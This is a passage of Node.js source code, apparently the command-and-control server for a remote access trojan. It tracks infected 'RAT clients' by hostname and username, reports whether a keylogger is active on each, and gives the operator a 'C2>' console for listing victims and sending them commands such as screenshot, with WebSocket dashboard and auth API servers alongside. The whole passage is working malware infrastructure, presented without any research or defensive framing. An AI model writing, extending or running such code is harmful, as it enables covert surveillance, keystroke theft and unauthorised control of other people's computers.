        // Broadcast keylog status: offline (but still scheduled to resume)
        try {
            const clientRow = db.getClient(socket.clientId);
            if (clientRow && clientRow.keylog_active === 1) {
                broadcastToDashboard({ type: 'keylog_status', clientId: socket.clientId, active: false, pending_resume: true, timestamp: Date.now() });
            }
        } catch(e){}

        // Broadcast updated client list immediately
        broadcastClientList();

        // Notify only the owner dashboard(s)
        broadcastToDashboard({
            type: 'client_disconnected',
            clientId: socket.clientId,
            timestamp: Date.now()
        });
    });

    socket.on('error', (error) => {
        console.error(`RAT client ${socket.clientId} error:`, error.message);
        // Only remove on error if socket is actually destroyed
        if (socket.destroyed) {
            ratClients.delete(socket.clientId);
        }
    });
});

// Start TCP server
tcpServer.listen(TCP_PORT, () => {
    console.log(`TCP server started on port ${TCP_PORT}`);
});

// Setup readline for console commands
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'C2> '
});

// Handle console commands
rl.on('line', (line) => {
    const input = line.trim();
    if (!input) {
        rl.prompt();
        return;
    }

    const parts = input.split(' ');
    const command = parts[0].toLowerCase();

    switch (command) {
        case 'list':
            console.log('\n=== Connected RAT Clients ===');
            if (ratClients.size === 0) {
                console.log('No clients connected');
            } else {
                ratClients.forEach((client, id) => {
                    const info = client.info || {};
                    const status = client.socket && !client.socket.destroyed ? 'online' : 'offline';
                    const lastSeen = formatTimestamp(client.lastSeen);
                    console.log(`ID: ${id}`);
                    console.log(`  Hostname: ${info.hostname || 'Unknown'}`);
                    console.log(`  Username: ${info.username || 'Unknown'}`);
                    console.log(`  Status: ${status}`);
                    console.log(`  Last Seen: ${lastSeen}`);
                    console.log(`  Connected: ${client.connectedAt ? formatTimestamp(client.connectedAt) : 'Unknown'}`);
                    console.log('');
                });
            }
            break;

        case 'send':
            if (parts.length < 3) {
                console.log('Usage: send <clientId> <command>');
                console.log('Example: send abc123 screenshot');
            } else {
                const clientId = parts[1];
                const cmd = parts.slice(2).join(' ');
                const success = sendCommandToRat(clientId, cmd);
                if (success) {
                    console.log(`Command sent to client ${clientId}: ${cmd}`);
                } else {
                    console.log(`Failed to send command. Client ${clientId} not connected.`);
                }
            }
            break;

        case 'help':
            console.log('\n=== Available Commands ===');
            console.log('list                    - Show connected RAT clients');
            console.log('send <clientId> <cmd>   - Send command to specific client');
            console.log('help                    - Show this help');
            console.log('exit                    - Exit the bridge');
            break;

        case 'exit':
            console.log('Exiting bridge...');
            process.exit(0);
            break;

        default:
            console.log(`Unknown command: ${command}`);
            console.log('Type "help" for available commands');
            break;
    }

    rl.prompt();
}).on('close', () => {
    // stdin closed (running detached) — just disable prompt, keep running
    console.log('Console input disabled (running in background)');
});

// Periodic maintenance tasks (only for dashboard clients - very lenient)
setInterval(() => {
    const now = Date.now();
    
    // Cleanup stale dashboard clients (90 seconds without ping)
    dashboardClients.forEach((data, ws) => {
        if (now - data.lastPing > 90000) { // 90 seconds
            console.log(`Cleaning up stale dashboard client: ${data.clientId}`);
            try {
                ws.terminate();
            } catch (error) {
                console.error('Error terminating stale dashboard client:', error.message);
            }
            dashboardClients.delete(ws);
        }
    });
    
    // Broadcast updated client list periodically (every 30 seconds)
    broadcastClientList();
    
    // Ping dashboard clients (every 30 seconds)
    dashboardClients.forEach((data, ws) => {
        pingDashboardClient(ws);
    });
    
}, 30000); // Run every 30 seconds

// Handle server shutdown
process.on('SIGINT', () => {
    console.log('\nShutting down servers...');
    
    // Close all RAT connections
    ratClients.forEach(client => {
        if (client.socket && !client.socket.destroyed) {
            client.socket.destroy();
        }
    });
    
    // Close all dashboard connections
    dashboardClients.forEach((data, ws) => {
        ws.close();
    });
    
    // Close servers
    wss.close();
    tcpServer.close();
    rl.close();
    
    console.log('Servers closed');
    process.exit(0);
});

// Start Auth API server
const authAPI = new AuthAPI(authManager, 8081);
authAPI.start();

console.log('C2 Bridge Server started');
console.log(`- WebSocket (Dashboard): ws://localhost:${WS_PORT}`);
console.log(`- TCP (RAT Clients): localhost:${TCP_PORT}`);
console.log(`- Auth API: http://localhost:8081`);
console.log('Type "help" for console commands');
rl.prompt();

